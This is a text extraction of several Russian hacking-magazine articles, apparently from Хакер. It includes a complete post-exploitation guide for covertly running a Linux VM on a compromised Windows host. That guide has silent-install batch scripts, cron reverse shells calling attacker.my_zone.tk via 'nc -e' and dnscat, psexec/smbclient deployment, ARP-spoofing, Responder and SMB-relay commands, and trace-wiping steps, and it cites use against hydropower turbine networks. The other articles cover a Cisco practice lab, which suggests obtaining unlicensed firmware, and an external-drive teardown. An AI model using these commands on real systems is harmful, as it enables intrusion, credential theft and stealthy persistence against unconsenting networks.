программы давала код, идентичный вызову виртуаль ной функции? Как ска‐
зать... Теоретически да, но практически едва ли такое удастся сделать (а уж
непреднамерен но — тем более). Код вызова виртуальных функций в связи
с большой избыточностью очень специфичен и легко различим на глаз. Нет‐
рудно сымитировать общую технику работы с виртуальными таблицами,
но без ассемблер ных вставок невоз можно воспро извести ее в точности.


ЗАКЛЮЧЕНИЕ
Вообще, как мы видим, работа с вир туаль ными функциями сопряжена
с огромной избыточностью и «тормозами», а их ана лиз свя зан с большими
трудозатратами — при ходится постоянно держать в голове множес тво ука‐
зателей и помнить, какой из них на что ука зывает. Но как бы там ни было,
никаких принципиально  неразрешимых  преград перед  иссле дователем
не стоит.
ВЗЛОМ





                                                                                            s0i37
                                                                                                 Senior offensive security re‐
                                                                                                      searcher in USSC.
                                                                               OSCP|OSCE holder.
                                                                                                    s0i37@ya.ru





 ПИНГВИН-СУПЕРШПИОН
    ИСПОЛЬЗУЕМ ВИРТУАЛКУ С LINUX
   ДЛЯ ПОСТЭКСПЛУАТАЦИИ WINDOWS




Реализовать MITM‐атаку на Windows куда сложнее, чем
на Linux, потому что нет нормальной возможности пересы‐
лать транзитные пакеты. Мы сде лаем так, чтобы шлюзом был
минималистичный Linux, поднятый как виртуальная машина.
При этом сетевые интерфейсы будут объединены в мост, что
даст возможность гостевой ОС получить полноценный L2‐
доступ в тот же сетевой сегмент, что и скомпрометирован‐
ной Windows. А поможет нам в этом VirtualBox.


Представь, что тебе удалось пробить сетевой периметр и получить дос туп
к серверу, который работает на Windows. Но что дальше? Нужно двигаться
по инфраструктуре — от DMZ до контроллера домена или до технологической
сети и управле ния турбинами!
  Или  что мы уже  давно  в  локальной  сети, но  захватить  контроль
над каким‐либо сервером не получается — все обновления установлены
и нет никаких зацепок, кроме скомпромети рованных машин в ее VLAN.
  И в том и в другом случае атакующий — это интерфейс пря мо в VLAN
скомпрометированной машины, да еще и на уровне L2. Тем самым мы прев‐
ратили бы подконтроль ный нам хост с Windows в некий шлюз и избавили бы
себя от необходимости ставить специальное ПО для сканирования сети
и разного рода сетевых атак.
   У доступа L2 есть ряд дополнительных преимуществ. Мы можем про‐
водить:
 • MITM‐атаки, эксплуатируя слабос ти протоко ла Ethernet (arpspoof);
 • атаки на NetBIOS (responder);
 • атаки на IPv6 (mitm6).

MITM‐атаки — один из самых мощных приемов про тив локальных сетей, пос‐
троенных по технологии Ethernet. Этот тип атак открывает широкие горизонты
и позволяет брать совсем неп риступные с виду хосты, просто прослушивая их
сетевой трафик на предмет наличия в нем учетных данных либо как‐то
модифицируя его.
   Так уж сложилось, что большинство хостов в локальных сетях работают
на Windows. И так уж сложилось, что Windows, мягко говоря, не лучшая плат‐
форма для атак. Здесь нельзя полноценно реализовать IP forwarding, поэтому
атака подобного рода грозит тем, что будет парализована работа всего
сетевого сегмента.
  Другие способы провернуть тоже неп росто. Например, можно было бы
настроить OpenVPN и сетевой мост, но настройка мос та из командной строки
в Windows реализована плохо, и, изменив настройки, скорее все го, ты без‐
возвратно потеряешь дос туп.


РЕАЛИЗАЦИЯ
Разумеется, для пол ноценной пос тэкс плуатации потребу ются адми нистра‐
тивные полномочия.
  В качестве вир туальной машины, в которой мы будем запус кать Linux
на скомпрометированном хос те, я предлагаю использовать VirtualBox, пос‐
кольку она:
 • может быть установлена в тихом режиме;
 • поставляется с крайне функциональным CLI‐инстру ментом VBoxManage;
 • может работать на ста ром железе без аппа ратной виртуализации;
 • позволяет запустить виртуальную машину в фоне.

На первый взгляд такое решение может показать ся немного громоздким, но,
с другой стороны, у него есть свои плюсы:
 • такой подход никак не палится антивиру сом, ведь мы используем только
   легитимное ПО;
 • не требуется ничего делать через гра фичес кий интерфейс, достаточно
   psexec, webshell или netcat;
 • будет работать на всех Windows от XP/2003 до 10/2019;
 • метод достаточно чист в плане следов — все действия происходят в фай‐
   ловой системе виртуальной машины.

Главным же минусом будет необходимость копировать около 500 Мбайт фай‐
лов. Но зачастую это не особен но большая проб лема.
  Но сразу должен тебя предупредить, что есть случай, когда эта техника
не сработает. Если скомпрометированная сис тема — это уже виртуальная
машина, то вполне может быть, что в ее настройках отключен нераз борчивый
режим для сетевой карты. Это может привести к тому, что сетевые пакеты
не будут заходить в нашу виртуальную машину.


ДЕЛАЕМ ГОСТЕВУЮ СИСТЕМУ
В качестве гостевой ОС есть смысл рассматривать два варианта:
 • Kali Linux с полноценным набором хакерского софта;
 • минималистичный дистрибутив с OpenVPN, который будет играть роль
  шлюза.

С первым вариантом все прос то — скачал и запус тил. В Kali почти наверняка
будет весь необходимый арсенал.
  Но мы вместо того, что бы закидывать в эту вир туалку весь любимый софт,
соберем свою с чистого листа и превратим в шлюз, который предоставит нам
комфортный L2‐доступ к ата кованному хос ту из любой точки мира.
   Так мы сэкономим 1–2 Гбайт места, так как весь ][‐софт будет запускаться
с машины атакующего, да и антивирус в таком случае ничего не увидит.
   Чтобы сделать дистрибутив минималистичным, потребу ется создать его,
что называется, from scratch. Наиболее переносимым вариантом будет 32‐
битная система.
  Создаем образ, который впос ледс твии будем напол нять:


truncate ‐s 1G linux.img

Мы указали размер образа с запасом в 1 Гбайт, в дальнейшем формат VDI
сожмет пустоты.
  Создаем разметку диска — один логичес кий раздел:



  $ fdisk linux.img
    Command (m for help):n
    Command (m for help):p
    Partition number (1‐4, default 1):
    First sector (2048‐2097151, default 2048):
    Last sector, +/‐sectors or +/‐size{K,M,G,T,P} (2048‐2097151, default
  2097151):
    Command (m for help):w
    Command (m for help):q


Создаем файловую систему и монтиру ем готовый раздел:


sudo losetup ‐o $[2048* 512] /dev/loop0 linux.img
sudo mkfs.ext4 /dev/loop0
sudo mount /dev/loop0 /mnt/

Скачиваем минимальный набор user‐space:


sudo debootstrap ‐‐arch= i386 ‐‐variant= minbase stable /mnt/
http://http.us.debian.org/debian

Теперь осталось соб рать ядро:


cd /usr/src/linux‐5.5.1/

Создаем дефолтную конфигура цию ядра:


make ARCH= i386 defconfig

Также нам потребуется нес колько дополнительных модулей:


make ARCH= i386 menuconfig

 • Сперва самое главное — поддержка сетевого моста (bridge): Networking
   support → Networking options → 802.1d Ethernet Bridging.
 • Поддержка вир туальных интерфейсов (tun) тоже потребу ется: Device Driv‐
   ers → Network device support → Network core driver support → Universal
   TUN/TAP device driver support.
 • Помимо OpenVPN, туннель можно построить и через GRE (опционально):
   Networking support → Networking options → TCP/IP networking → The IPv6
   protocol → IPv6: GRE tunnel.
 • Для построения PPP‐туннелей в одну команду (тоже опционально): Device
   Drivers → Network device support → PPP (point‐to‐point protocol) support.

Собираем ядро:


make ARCH= i386 prepare
make ARCH= i386 scripts
make ARCH= i386 bzImage

Собираем модули:


make ARCH= i386 modules

После того как все соб ралось, копиру ем ядро и модули:


make INSTALL_PATH= /mnt/boot install
make INSTALL_MOD_PATH= /mnt/ modules_install

Остался RAM‐диск. Его, если хост‐система 64‐битная, лучше собрать на 32‐
битной системе. Только что ска чанное через debootstrap окружение иде ально
подходит для этого:


chroot /mnt/
mkinitramfs ‐k ‐o /boot/initrd.img‐5.5.0 5.5.0
apt remove initramfs‐tools‐core && apt autoremove
exit

И последнее — загрузчик ОС.


grub‐install ‐‐target= i386‐pc ‐‐boot‐directory= /mnt/boot/ linux.img
‐‐modules='part_msdos'

Пропишем опции для загрузки:



mnt/boot/grub/grub.cfg

set timeout=5
menuentry "Debian Linux" {
  linux /boot /vmlinuz‐5 .5 .0 root =/dev /sda1 rw
  initrd /boot /initrd .img ‐5 .5 .0
}

Готово. Мы получили полностью работос пособную ОС. Теперь нужно слегка
настроить ее. Снова заходим в файловую систему:


chroot /mnt/

Сперва настроим SSH, без это го никуда:


apt install openssh‐server
update‐rc.d ssh enable 2 3 4 5

Не забываем указать пароль для root:


passwd root

Теперь очередь сервера OpenVPN, через который и предполагается орга‐
низовывать себе доступ:


apt install openvpn

Опустим этап генерации сертифика тов и ключей для OpenVPN. Итоговый кон‐
фиг для серверной стороны должен выг лядеть так:


local 10.10.10.10
port 1194
proto tcp
dev tap


user nobody
group nogroup


<ca>
...
</ca>


<cert >
...
</cert >


<key >
...
</key >


<dh>
...
</dh>


cipher AES ‐128 ‐CBC
comp ‐lzo


server ‐bridge 10.10.10.10 255 .255 .255 .0 10.10.10.40 10.10.10.50
script ‐security 2
up /etc /openvpn/up.sh
down /etc /openvpn/down .sh


persist‐key
persist‐tun

Здесь up.sh и down.sh — это скрип ты, которые должны добавлять интерфейс
VPN в сетевой мост.



/etc/openvpn/up.sh

#!/bin/sh
/usr/sbin/brctl addif br0 "$1"
/usr/sbin/ifconfig "$1" up



/etc/openvpn/down.sh

#!/bin/sh
/usr/sbin/brctl delif br0 "$1"
/usr/sbin/ifconfig "$1" down

Дополнительно я для себя добавил клиент OpenVPN для под ключения к VDS,
который поднимется сразу пос ле запуска вир туалки и позволит подключаться
откуда угодно.
   Также на случай, если виртуалка поднимается в фильтруемом сетевом
сегменте, я предусмотрел обратный шелл. Прописы ваем в cron:


* * * * * /bin/nc ‐e /bin/bash attacker.my_zone.tk 8888

А на случай, если нет интернета, но есть эксфильтрация DNS (что бывает
очень часто), прописываем в cron еще такую стро ку:


* * * * * /bin/ping ‐c 1 dnsshell.my_zone.tk 1> /dev/null 2>
/dev/null && /usr/local/bin/dnscat dnscat.my_zone.tk

И в том и в другом случае, контролируя свою зону DNS через attacker.my_‐
zone.tk и dnscat.my_zone.tk, можно управлять поведением реверс‐шеллов.
   Теперь осталось очис тить базу dpkg, так мы освободим 50 Мбайт места:


apt clean

И отмонтируем готовую ФС:


umount /mnt
losetup ‐d /dev/loop0

Последний штрих — создание образа для VirtualBox. Предварительно скон‐
вертируем его в формат VDI:


qemu‐img convert ‐O vdi linux.img linux.vdi

Все готово. Теперь импортируем диск в VirtualBox, указываем количество
процессоров и оперативки (все по минимуму) и на выходе получаем готовый
файл linux.ova, который можно будет импортировать на любом хосте без лиш‐
них вопросов.
  В итоге весь образ занял у меня 341 Мбайт.


ТИХАЯ УСТАНОВКА И ЗАПУСК VIRTUALBOX
Скачиваем дистрибутив VirtualBox. Я взял версию 5.2.6‐120293, она должна
работать в любой Windows с XP по 10.
   Чтобы установить ее в тихом режиме, потребуется достать установочные
пакеты .msi:


virtualbox‐5.2.6‐120293‐Win.exe ‐extract

В папке %USER%\appdata\local\temp\virtualbox\ будут лежать все необ‐
ходимые для установки файлы:
 • VirtualBox‐5.2.6‐MultiArch_amd64.msi
 • VirtualBox‐5.2.6‐r120293‐MultiArch_x86.msi
 • common.cab

Также потребуется достать сертификат из любого драйвера VirtualBox, чтобы
перед установкой добавить его в trusted и обойти тем самым окно с уведом‐
лением о левом драйвере.
  Для удобства вот батник, который деп лоит все, что нужно, в скры том
режиме:


pushd %~dp0
certutil ‐addstore TrustedPublisher cert .cer
dir "\prog*86)" > nul 2> nul && (
  msiexec /i VirtualBox‐5 .2.6‐r120293‐MultiArch _amd64.msi /quiet /
log vbox_install .log ALLUSERS=2 ADDLOCAL=VBoxApplication,
VBoxNetworkFlt VBOX_INSTALLDESKTOPSHORTCUT=0
VBOX_INSTALLQUICKLAUNCHSHORTCUT=0 VBOX_REGISTERFILEEXTENSIONS=0
VBOX_START=0 INSTALLDIR=c :\post\
) || (
  msiexec /i VirtualBox‐5 .2.6‐r120293‐MultiArch _x86.msi /quiet /log
vbox_install .log ALLUSERS=2 ADDLOCAL=VBoxApplication,VBoxNetworkFlt
VBOX_INSTALLDESKTOPSHORTCUT=0 VBOX_INSTALLQUICKLAUNCHSHORTCUT=0
VBOX_REGISTERFILEEXTENSIONS=0 VBOX_START=0 INSTALLDIR=c :\post\
)
ping ‐n 300 127 .0.0.1 >nul
c :\post\vboxmanage import linux .ova ‐‐options keepallmacs


c :\post\vboxmanage list bridgedifs|findstr /R "^Name:" > out .txt
setlocal enabledelayedexpansion
set /a c=1
for /f "tokens=2*" %%i in ('type out.txt') do (
  echo c :\post\vboxmanage modifyvm linux32 ‐‐nic!c! bridged ‐
‐bridgeadapter!c! "%%i %%j" >> out .bat
  echo c :\post\vboxmanage modifyvm linux32 ‐‐nicpromisc!c! allow‐all
>> out .bat
  set /a c=c+1
)
chcp 1251
call out .bat
chcp 866
c :\post\vboxmanage modifyvm linux32 ‐‐pae on
c :\post\vboxmanage startvm linux32 ‐‐type headless


                    LinuxАргументы в пользу
Возможно, пролистав все нас тройки, ты уже готов пожаловаться на то, что
все это слишком сложно. Но на самом деле ничего сложного здесь нет.
Наоборот — сложно работать, используя хакерский софт для Windows,
который:
 • в половине случаев не заведется или заведется, но не будет нормально
   работать;
 • также в половине случаев захочет показать гра фическую оболочку, а это
   зачастую роскошь;
 • потребует как‐то обхо дить антивирус ное ПО;
 • потребует ставить интерпретаторы типа Python и кучу разных зависи мос‐
   тей, что без доступа к интернету станет допол нительной проблемой;
 • иногда может потребовать даже перезаг рузку (в Windows частое явле ние);
 • никак не сравнится по функциональности и гиб кости с аналогичной эко‐
   системой в Linux.




ДЕПЛОЙ НА УДАЛЕННОМ ХОСТЕ
Последний этап, который мы рассмотрим, — это запуск нашей виртуальной
машины на захваченной машине с Windows.
  Для начала копируем все и запускаем:


cd /usr/share/windows‐binaries/vbox/
smbclient ‐U user%pass //owned_host ‐c "mkdir post; cd post; put
cert.cer; put common.cab; put install.bat; put linux.ova; put
VirtualBox‐5.2.6‐r120293‐MultiArch_amd64.msi; put VirtualBox‐5.2.
6‐r120293‐MultiArch_x86.msi"
psexec.py user:pass@owned_host "start c:\post\install.bat"

Ждем пять минут, и если все пошло хорошо, то в требуемом сетевом сег‐
менте появится новый хост с открытым 22‐м портом, куда мы сможем зайти:


ssh root@vbox_vm

Дальше помещаем нужный сетевой интерфейс в мост:


brctl addbr br0; brctl addif br0 enp0s3; ifconfig enp0s3 0 promisc;
ifconfig br0 10.10.10.10/24; route add ‐net default gw 10.10.10.1

Важно все сделать одной командой, чтобы не потерять связь.
  Скорректируем выданный виртуалке IP‐адрес в /etc/openvpn/server.
conf, после чего запускаем его:


openvpn ‐‐config server.conf

Далее уже на сво ей основной системе (с Linux, конечно же) делаем


openvpn ‐‐config client.conf

И получаем интерфейс tap0, словно мы подклю чены патч‐кордом в VLAN
скомпрометированной системы. Здесь уже можем творить все, что захотим:


ettercap ‐i tap0 ‐Tq ‐o ‐M arp:remote /gateway// /dc//
responder ‐I tap0 ‐r ‐d ‐w ‐F
netcreds ‐i tap0
iptables ‐t nat ‐A PREROUTING ‐i tap0 ‐p tcp ‐‐dport 445 ‐j REDIRECT
‐‐to‐ports 445
smbrelayx.py ‐h target ‐e shell.exe
iptables ‐t nat ‐A PREROUTING ‐i tap0 ‐p tcp ‐‐dport 80 ‐j REDIRECT
‐‐to‐ports 10000
mitmf ‐i tap0 ‐‐smbauth

И многое, многое другое.
  В итоге благодаря магии виртуализации и сетевых туннелей мы откры ли
портал в сетевой сегмент скомпро метированной системы и тем самым
выжали максимум пользы во время постэкс плуатации. Теперь мощь всех инс‐
трументов, реализованных главным обра зом в Linux, обрушит неприступность
практически любой, даже полностью пропат ченной и защищенной на первый
взгляд системы.


УХОДИМ КРАСИВО
Когда придет время заметать следы, выключа ем и удаляем виртуалку, уда‐
ляем VirtualBox, убираем сертификат, удаляем все файлы:


vboxmanage controlvm linux32 poweroff
vboxmanage unregistervm linux32 ‐‐delete
wmic product where name="Oracle VM VirtualBox 5.2.6" call uninstall
/nointeractive
certutil ‐delstore TrustedPublisher cert.cer
rmdir /s /q c:\p ost

Никаких следов. Поч ти.


ПРИМЕР ИЗ ЖИЗНИ
Напоследок — пример из практики, бла годаря которому и родилась описан‐
ная идея.
  Однажды на реальном  внут реннем пентесте мы  оказались  в шаге
от получения доступа к управлению турбинами гидроэлектростанции. Вся
загвоздка заключалась в том, что управляющий ПК не состоял в домене (так
часто бывает с технологическими компонентами) и не содержал никаких акту‐
альных уязвимостей.
   Единственным шансом была MITM‐атака или через ARP spooﬁng, или час‐
тичная через NetBios spooﬁng. Однако во всем сетевом сегменте не было
серверов с Linux, пригодных для эксплуата ции MITM‐атак, а доступ был лишь
на несколько смежных рабочих станций с Windows. И тогда мы провернули
описанную выше процедуру (правда, в качес тве гос тевой ОС запустили Kali).
  В результате минут через пятнадцать у нас была учетка локального адми‐
нистратора и доступ в технологичес кую сеть.
ВЗЛОМ
ВИРТУАЛЬНЫЙ
ПОЛИГОН

 ДЕЛАЕМ ЛАБОРАТОРИЮ
   СЕТЕВОГО ХАКЕРА





                   Валерий Линьков
                     Дипломированный
                  специалист и инструктор Cis‐
                     co, основатель академии Cis‐
                     co, автор технических статей
                    нацбезопасности России,
                      сисадмин, ИБшник,
                           питонист, гик
                                valerylinkov.ru





Вряд ли кто‐то в здравом уме станет отрабатывать хакер‐
ские атаки сразу в боевых усло виях. Для тренировки и экспе‐
риментов хорошо иметь тестовый стенд. Но что, если речь
об атаках на сеть? Ее тоже мож но сделать виртуальной, и в
этой статье я покажу, как развернуть свою лабораторию,
которая будет эмулиро вать работу с продуктами Cisco.


Главное условие, которого я ста ну держаться, — это нулевые затраты. Все
программы у нас будут бесплат ными, поэтому понадобится только компь‐
ютер — желательно с восемью или более гигабай тами опе ративной памяти
и не самым старым процес сором, пригодным для виртуализации (лучше все‐
го Intel). Ну и конеч но, понадобится дос туп в интернет — чем быстрее, тем
лучше.
  В качестве операционной системы я выб рал Windows 10 (x64).


СИМУЛЯТОР
Если эмуляторы пол ностью повторяют какое‐то устройство, то симуля тор
лишь имитирует предполага емое поведение. Соответственно, симуля торы
потребляют меньше ресурсов — например, полноценно эмулировать работу
маршрутизатора третьего уровня наш ПК не смо жет, а вот симулировать
его — вполне.
  В нашей лаборатории понадобится только один симуля тор, который будет
изображать сетевое оборудование Cisco. Программа называется Packet Trac‐
er. Чтобы ее получить, нужно записать ся в академию Cisco. Сде лаем мы
это бесплатно.
  Перейдя по ссылке, жмем желтую кнопку «Зарегистри роваться». Проходи
бесплатную регистрацию и логинь ся. В личном кабинете находим «Ресурсы
→ Загрузить Packet Tracer».
   Теперь ты полноцен ный студент Cisco, воору женный очень полезным инс‐
трументом. В Packet Tracer можно сделать сети раз ного уровня сложности
от простых до самых хитроумных. В интернете куча лабораторных работ по PT.
У меня на странице Хабра есть три круп ные лабораторные работы, стоит
начать изучение с них. Скоро будет пополнение.


GNS3
Первый эмулятор, который нам понадобится, — GNS3. Он может эмулиро‐
вать разное оборудование, не только Cisco. Тут мы сталкиваемся с неболь‐
шой проблемой. Дело в том, что в эмулятор нужно загружать прошивку эму‐
лируемого  устрой ства,  а  рас простра нение  этих  прошивок  запрещено
законом. Однако в разных стра нах законы раз ные, да и соблюдают их не все,
чем мы и воспользуемся — исключительно с целью самообразования!
  Нужные файлы лежат, например, на CareerCert или CertSource, но, если
они завтра уйдут на дно, ты без труда нагуглишь аналоги.
  Возможно, ты спросишь, зачем нужны такие слож ности, если можно с тем
же успехом исполь зовать все тот же Packet Tracer. Яркий пример того, что
не может PT, — подключить эмулируемую сеть к интерне ту.


VirtualBox
В работе обязательно пригодится обычная виртуал ка — бесплатный Virtual‐
Box вполне подойдет.


             INFO

                      Если вдруг ты не включил в BIOS режим вир‐
                        туализации, самое время это сделать. Перезаг‐
                       рузи ПК и зайди в BIOS, там вкладка Advanced →
                   CPU Conﬁguration → Secure Virtual Machine Mode
          → Enable. Далее жми F10.



UNetLab
Когда‐то разработчики этого сетевого эмулятора называли его «револю‐
ционным прыжком», но потом отка зались от его разработки, чтобы сконцен‐
трировать силы на его идейном нас леднике — EVE‐NG. Файлы с сай та они
тоже удалили, но у меня сохранилась копия последней версии.
   Чтобы установить UNetLab, ска чай его образ по ссылке и запусти его в Vir‐
tualBox. Затем перейди на вкладку «Нас трой ки» и установи в графе «Сеть»
на первом адаптере режим сетевого моста с тем сетевым устройством,
которым пользуешься для выхода в интернет.





                       Нас трой ка адаптера

Запустив виртуальную машину, ты увидишь во второй строке адрес эмулятора
в сети (у меня 192.168.2.152). Заходи по этому адресу через браузер.





                        Адрес эму лятора

Если все получилось, у тебя откроется стра ница UNetLab. Логин — admin,
пароль — url.





             INFO

                   В статье о том, как стать сисад мином, я расска‐
                      зывал про курсы NetSkills. Там тебя научат поль‐
                        зоваться этим прекрасным эмулятором.



EVE-NG
Вместо UNetLab можно использовать EVE‐NG. Дос тупны платная и бесплат‐
ная версии. Учиться использовать этот инс трумент можно по курсам UNetLab.
Там все практически идентично, а что отличается — выведено в отдельную
документацию на сайте.
   Если ты только знакомишь ся с обеими машина ми — начни с UNetLab. Все
крупные компании начали писать курсы по обучению именно на UNetLab,
до того как случился этот неожиданный переход на EVE‐NG. Научившись
пользоваться UNetLab, ты легко разберешься и с EVE‐NG.


Asterisk
Если ты всегда хотел научиться работать с IP‐телефонией — Asterisk тебе
очень поможет. Установка проста, но на всякий случай я заготовил для тебя
образ виртуальной машины — качай и запус кай. Сра зу же можно начать нас‐
траивать полноценную сеть IP‐телефо нов.


СЕТЕВОЙ ТОПОР
Свое название набор виртуальных машин получил из‐за схожес ти с инс тру‐
ментом. Набор состоит из безобидной машины работника (древко), опас ной
машины хакера (топорище), а связаны они простым роуте ром (веревка).
Опять же топор может нести как помощь человеку, так и разрушение.
   У нас виртуальных машин будет четыре. Как это выглядит, можешь видеть
на картинке.





                       Сетевой топор

Я снова подготовил четыре обра за. В конце у нас дол жна получиться сле‐
дующая конфигурация.





К слову, эта конфигурация полностью соответству ет сертификации Cisco Cy‐
berOps, а в машину работника встро ены бесплат ные утилиты для работы
с сетью, рекомен дованные все тем же курсом.
  Приступим к настройке.


Шаг 1: импортируем файл машины CyberOps в VirtualBox
Открой VirtualBox. Выбери в меню пункты File → Import Appliance... («Файл →
Импорт устройств...»), что бы импортировать образ виртуальной машины.





                    Импорт машины

Откроется новое окно. Укажи местополо жение файла .OVA и жми Next.
Появится новое окно с параметрами для архива OVA. Установи в нижней час‐
ти окна флажок Reinitialize the MAC address of  all network cards («Создать
новые MAC‐адреса для всех сетевых адап теров»). Остальные параметры
менять не следует. Нажми «Импорт».





                        MAC

Когда импорт завершится, ты увидишь в списке виртуальных машин VirtualBox
новую виртуальную машину. Теперь она готова к работе. Повтори все опе‐
рации с каждой системой. Должны быть добавлены четыре операционки.





                        Четыре системы


Шаг 2: объединяем в сеть виртуальные машины и создаем
виртуальную лабораторную среду
В ВМ Kali настро ен один сетевой адаптер в режиме внутренней сети в сети
VLAN internet. Это соот ветс тву ет такой схеме.




                                            Kali

В ВМ Metasploitable нас троены два сетевых адаптера в режиме внутренней
сети. Адаптер 1 соот ветс твует нашим требова ниям и принад лежит виртуаль‐
ной локальной сети dmz. Адаптер 2 отоб ражается в  VirtualBox, но он
не используется в этой топологии, и его мож но пропустить.




                                Metasploitable

В ВМ Security Onion настро ены четыре сетевых адаптера: три в режиме внут‐
ренней сети и один в режиме NAT (он может использоваться для доступа
к интернету). Security Onion объединяет все виртуаль ные машины в виртуаль‐
ную сеть, каждой сети VLAN принадлежит один сетевой адаптер (Inside, DMZ
и Internet).





                                 Security Onion

Виртуальная машина CyberOps Workstation работает в режиме моста. Она
не принадлежит ни одной внутренней сети дру гих виртуальных машин. Нужно
будет изменить настройку сетевого адаптера.




                            CyberOps

Выбери в VirtualBox виртуальную машину CyberOps Workstation и щел кни Set‐
tings. Выбери Network и измени режим адап тера 1 на внутреннюю сеть с име‐
нем inside. Щелкни ОК.





                      Нас трой ка CyberOps

Теперь, когда сетевой адаптер находится в пра вильной внутренней сети
или VLAN, запусти ВМ CyberOps Workstation и выполни вход. Там необходимо
будет изменить параметры IP‐адреса, чтобы получить возможность обме‐
ниваться данными по виртуальной сети.
  Открой командную строку и прос мотри содержимое папки сценариев
в папке lab.support.files/scripts.



  [analyst@secOs~]$ ls lab.support.files/scripts
  configure_as_dhcp.sh cyops.mn start_ELK.sh
  configure_as_static.sh fw_rules start_miniedit.sh
  cyberops_extended_topo_no_fw.py mal_server_start.sh start_pox.sh
  cyberops_extended_topo.py net_configuration_files start_snort.sh
  cyberops_topo.py reg_server_start.sh start_tftpd.sh


Сценарий configure_as_dhcp.sh использует ся для настройки сетевого
интерфейса через запрос IP‐адреса от сервера DHCP. Это параметр нас‐
тройки по умолчанию для вир туальной машины CyberOps Workstation. Чтобы
настроить адаптер на среду с нес колькими ВМ, необходимо запустить сце‐
нарий configure_as_static.sh. Это настро ит на сетевом интерфейсе ста‐
тический IP‐адрес 192.168.0.11 и шлюз по умолчанию 192.168.0.1, в роли
которого выступает ВМ Security Onion. Вир туаль ная машина Security Onion
отвечает за маршрутизацию между внут ренними сетями Inside, DMZ и Internet.
Запусти сценарий configure_as_static.sh и введи пароль (при появлении
запроса) для настрой ки IP‐адреса 192.168.0.11 в виртуальной сети.



  [analyst@secOs~]$ sudo ./lab.support.files/scripts/configure_as_static.
  sh
  [sudo] пароль для analyst:
  Configuring the NIC as:
  IP: 192.168.0.11/24
  GW: 192.168.0.1
  IP Configuration successful.



             INFO

                      Если необходимо  использовать ВМ  CyberOps
                         Workstation  в  качестве  изолированной  среды
                        с доступом в интернет, то переведи сетевой
                       адаптер обратно в режим мостового соединения
                      и запусти сценарий configure_as_dhcp.sh.


Вернись в окно VirtualBox и вклю чи другие виртуальные машины: Kali Linux,
Metasploitable  и  Security  Onion. Информа цию об имени  пользовате ля
и пароле см. в таблице. Когда все виртуальные машины запущены, отправь
эхозапрос с ВМ CyberOps Workstation на вир туаль ные машины Metasploitable
и Kali Linux. Используй сочета ние клавиш Ctrl + C, чтобы остановить эхозап‐
рос.



  [analyst@secOps ~]$ ping 209.165.200.235
  PING 209.165.200.235 (209.165.200.235) 56(84) bytes of data.
  64 bytes from 209.165.200.235: icmp_seq=1 ttl=63 time=1.16 ms
  64 bytes from 209.165.200.235: icmp_seq=2 ttl=63 time=0.399 ms
  64 bytes from 209.165.200.235: icmp_seq=3 ttl=63 time=0.379 ms

  C

  ‐‐‐ 209.165.200.235 ping statistics ‐‐‐
  3 packets transmitted, 3 received, 0% packet loss, time 2002ms
  rtt min/avg/max/mdev = 0.379/0.646/1.162/0.365 ms


  [analyst@secOps ~]$ ping 209.165.201.17
  PING 209.165.201.17 (209.165.201.17) 56(84) bytes of data.
  64 bytes from 209.165.201.17: icmp_seq=1 ttl=63 time=0.539 ms
  64 bytes from 209.165.201.17: icmp_seq=2 ttl=63 time=0.531 ms
  64 bytes from 209.165.201.17: icmp_seq=3 ttl=63 time=0.567 ms
  64 bytes from 209.165.201.17: icmp_seq=4 ttl=63 time=0.408 ms
  64 bytes from 209.165.201.17: icmp_seq=5 ttl=63 time=0.431 ms

  C

  ‐‐‐ 209.165.201.17 ping statistics ‐‐‐
  5 packets transmitted, 5 received, 0% packet loss, time 4065ms
  rtt min/avg/max/mdev = 0.408/0.495/0.567/0.064 ms


Заверши работу каждой машины, сохраняя изменения.


ВЫВОДЫ
Мы создали домашнюю лабора торию сетево го хакера, в которой можно
симулировать работу сети и эмулировать работу сети как с виртуальной
машиной, так и без. Настро или эмулятор сети для создания сложных про‐
ектов с использованием реальных прошивок устройств, сделали эму лятор
сети IP‐телефонии и создали виртуальное окружение «Сетевой топор», где
можно тестировать системы на уяз вимос ти и не только видеть, что происхо‐
дит в системе атакующего и атакуемого, но и наблюдать за демилитари‐
зованной зоной и роутером — связ чиком сети.
  Можешь дополнить лабора торию средствами раз работки, инс трументами
и облегчающими жизнь мелочами на свой вкус.


        WWW

                     Все виртуальные машины из статьи
ТРЮКИ
ГОЛЫЕГОЛЫЕ
    ДИСКИ    ДИСКИ





               СМОТРИМ, ЧТО ВНУТРИ
               У ВНЕШНИХ НАКОПИТЕЛЕЙ
                   WD И SEAGATE





Внешние накопители бывают дешевле ана‐
логичных по объему жестких дисков, про‐
дающихся без корпуса. Казалось бы, что
мешает разобрать корпус, извлечь жесткий
диск  и  использовать  его  отдельно?           Олег Афонин                                                                                      Эксперт по мобильной
Не  мешает  ничего,  кро ме  того,  что       криминалистике«Элкомсофт»компании
это  занятие может  оказаться бессмыс‐        aoleg@voicecallcentral.com
ленным. Давай вместе попробуем разоб‐
раться, какие имен но диски скрываются
в черных плас тиковых корпусах, можно ли
их использовать отдельно, и если да, то
в каких сценариях.


ДИВАННАЯ АНАЛИТИКА
Согласись, трудно себе представить, что произво дители жестких дис ков WD
и Seagate не умеют считать деньги и продают хороший товар значительно
дешевле, иногда даже вдвое. Но пользоваться этим стоит, только если
заранее хорошо знаешь, что именно будет внутри корпуса. Производители
вовсе не стремятся пустить под нож более при быльные продажи «дисков
отдельно» и, за редкими исключениями (о них мы поговорим поз же), не рас‐
скажут о том, какой именно диск установлен.
  Более того, в одной и той же модели внешнего накопителя — к примеру,
WD Elements Desktop, — могут устанавливаться совершенно раз ные дис ки
как по объему, так и по другим, неизвестным широкой публике параметрам.
Планировал получить WD Red, а внут ри оказал ся WD Blue? Извини, но это —
плохое основание для воз врата. Согласен на WD Blue, а пришел непонятный
диск с белой наклейкой? Это не всегда плохо, но и здесь есть важные осо‐
бенности.
   Казалось бы, неплохой спо соб узнать о содержимом той или иной модели
– поискать в Google. Вполне вероятно, что первыми ссылками в выдаче будут
обсуждения в Reddit. И первое, что я попрошу тебя сделать — это забыть
на минуту о том, что ты мог прочесть о внешних дис ках в популярных комь‐
юнити Reddit. В разных партиях внеш них накопителей могут устанавливаться
разные модели дисков, и тот факт, что какому‐то анонимному пользователю
в руки попала какая‐то конкрет ная модель, вовсе не означает, что тебе дос‐
танется такая же или хотя бы похожая. Более того, сре ди пользователей Red‐
dit ходит множество мифов, на раз ные лады повторя емых из года в год.
Об этих мифах мы тоже поговорим.


ПРЕКРАСНЫЙ НОВЫЙ МИР
Еще пару лет назад все было просто: внешние диски Western Digital объ емом
до 6 Тб вклю чительно были вентилиру емыми (атмосферными, то есть напол‐
